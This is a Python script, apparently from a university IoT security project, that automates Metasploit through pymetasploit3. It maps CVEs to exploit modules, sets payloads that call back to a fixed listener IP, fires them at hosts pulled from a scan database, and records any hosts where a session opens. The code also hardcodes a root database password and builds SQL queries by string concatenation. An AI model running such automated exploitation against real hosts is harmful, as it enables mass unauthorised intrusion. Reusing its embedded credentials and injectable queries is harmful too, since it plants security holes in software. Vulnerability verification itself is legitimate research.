from pymetasploit3.msfrpc import *
from parser import process_parser
from update import getCvesDescrip
import pymysql
import json

'''
exploit_product

steps
1. 通過cve找尋可用modules
2. 設定modules
3. 設定payload
4. 結果回傳到msfconcole
5. 將有弱點之設備回傳

input
1. prod_info
{ip:xxx,port:xxx,cve:xxx}
'''

alert_infos = []
def exploit_product(prod_info):
    #connnect to msfconcole
    client = MsfRpcClient('a407410040',port=55552)
    '''
    1. search module
    '''
    cve = 'cve:' + prod_info["cve"]
    cve_modules = client.modules.search(cve)
    
    #check modules empty or not
    if len(cve_modules) == 0:
        print("no corresponding modules")
        return
   
    module_fullname = cve_modules[0]["fullname"]
    if module_fullname.split('/')[0] != 'exploit':
        return
    module = '/'.join(module_fullname.split('/')[1:])
    #print(module)
    
    '''
    2. set module
    '''
    exploit = client.modules.use('exploit',module)
    #print(exploit.missing_required)
    if "RHOSTS" in exploit.missing_required:
        exploit['RHOSTS'] = prod_info["ip"]
        exploit['RPORT'] = prod_info["port"]
    elif "SESSION" in exploit.missing_required:
        print("we need session")
        return
    
    '''
    3. set payload
    '''
    #check payload empty or not
    if len(exploit.payloads) == 0:
        print("no useful payload")
        return
    
    p = exploit.payloads[0]
    payload = client.modules.use('payload',p)
    #print(payload.missing_required)
    if 'LHOST' in payload.missing_required:
        payload['LHOST'] = '140.123.230.32'
        payload['LPORT'] = 4444

    f = open("/var/www/html/ccu_proj_manyPorts/api/exploit.txt","a+")
    f.write(prod_info["ip"]+" " + prod_info["port"] + " "  + prod_info["cve"]+"\n")
    f.close()
    
    '''
    4. connect to console
    '''
    console_id = client.consoles.console().cid
    console = client.consoles.console(console_id)
    output = console.run_module_with_output(exploit,payload=payload)
    
    '''
    5. 將有弱點之設備回傳
    '''
    f = open("/var/www/html/ccu_proj_manyPorts/api/www/alert.json","w")
    if 'session' in output:
        if 'open' in output:
            cveInfo = getCvesDescrip(prod_info["cve"])
            info = {
                "ip" : prod_info["ip"],
                "port" : prod_info["port"],
                "cve" : prod_info["cve"],
                "cvss" : cveInfo["cvss"],
                "description" : cveInfo["description"]
            }
            alert_infos.append(info)
    json.dump(alert_infos,f)
    f.close() 

'''
prodinfo_from_db

功能
1. 從資料庫中取資料

input
1. table_id : 欲exploit的db

'''

def prodinfo_from_db(table_id):
    
    prod_infos = []
    db = pymysql.connect(host="140.123.230.32",user="root",passwd="a407410040",db="iot",cursorclass=pymysql.cursors.DictCursor)
    cursor = db.cursor()
    
    sql = "select * from ip_" + table_id
    cursor.execute(sql)
    res = cursor.fetchall()
    for row in res:
        info = {
            "ip":None,
            "port":[],
            "cve":[]
        } 
        #print(row)
        ip = row["ip"]
        info["ip"] = ip
        
        #port
        sql = "select * from port_" + table_id + " where port_ip='" + ip + "'"
        cursor.execute(sql)
        port_res = cursor.fetchall()
        #print(port_res)
        for port_row in port_res:
            info["port"].append(str(port_row["port"]))
    
        #cve
        sql = "select * from cve_" + table_id + " where cve_ip='" + ip + "'"
        cursor.execute(sql)
        cve_res = cursor.fetchall()
        for cve_row in cve_res:
            info["cve"].append(cve_row["cve_id"])
        prod_infos.append(info.copy())
    #print(prod_infos)
    return prod_infos

'''
exploit()

steps
1. 區分資料
2. 執行exploit_product
'''

def exploit(prod_infos):
    info = {}
    for i in range(len(prod_infos)):
        info["ip"] = prod_infos[i]["ip"]
        for j in range(len(prod_infos[i]["port"])):
            info["port"] = prod_infos[i]["port"][j]
            for k in range(len(prod_infos[i]["cve"])):
                info["cve"] = prod_infos[i]["cve"][k]
                print(info["ip"]+" "+info["port"]+" "+info["cve"])
                exploit_product(info)

'''
__main__

steps
1. prodinfo_from_db
2. exploit
'''

if __name__ == "__main__":
    #args = process_parser()
    #prod_infos = prodinfo_from_db(str(args.table_id)) 
    
    #test
    prod_infos = []
    info = {
        "ip":"140.123.230.32",
        "port":['8080'],
        "cve":['CVE-2017-17562']
    }
    prod_infos.append(info)
    
    exploit(prod_infos)
